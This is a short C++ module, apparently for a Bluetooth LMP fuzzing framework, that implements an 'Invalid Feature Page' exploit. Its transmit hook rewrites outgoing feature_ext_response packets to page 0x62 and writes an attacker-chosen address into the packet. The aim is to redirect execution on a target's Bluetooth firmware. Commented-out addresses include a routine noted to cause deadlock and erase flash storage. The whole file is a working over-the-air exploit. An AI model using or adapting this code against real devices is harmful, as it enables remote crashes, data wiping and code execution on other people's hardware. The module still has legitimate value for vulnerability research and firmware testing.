#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Filters

// Vars

// Setup
const char *module_name()
{
    return "Invalid Feature Page";
}

int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 2000;
    config->options.auto_start = true;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;

    return 0;
}

// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static char txt[64];
int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // Look for TX feature_ext_response
    if (p && pkt_length > 5 && ((pkt_buf[4] >> 1) == 127) && (pkt_buf[5] == 0x04))
    {
        // 1 Set page to 0x62
        pkt_buf[6] = 0x62; // Page 0x62
        // 2 Set arbitrary address
        uint32_t *pc_addr = (uint32_t *)&pkt_buf[8];
        // *pc_addr = 0xDEADBEEF;
        // *pc_addr = 0x400d34d0; // start_cpu0_default
        // *pc_addr = 0x40081108; // call_start_cpu0
        // *pc_addr = 0x400ebda8; // address of nvs_flash_erase - (Effect: Deadlock + NVS flushed)
        // address of nvs_flash_erase - (Effect: Deadlock + NVS flushed)
        // *pc_addr = 0x40112c94; // target firmware built/flashed via idf.py build
        *pc_addr = 0xDEADBEEE;       // target firmware built/flashed via make
        // *(pc_addr + 1) = 0xABCDEFAB; // target firmware built/flashed via make

        snprintf(txt, sizeof(txt), "Page 0x62 sent to execute address 0x%04X!!!\n", *pc_addr);
        wd_log_y(txt);
        return 1; // Indicate that packet has been changed
    }

    return 0;
}

// RX
int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}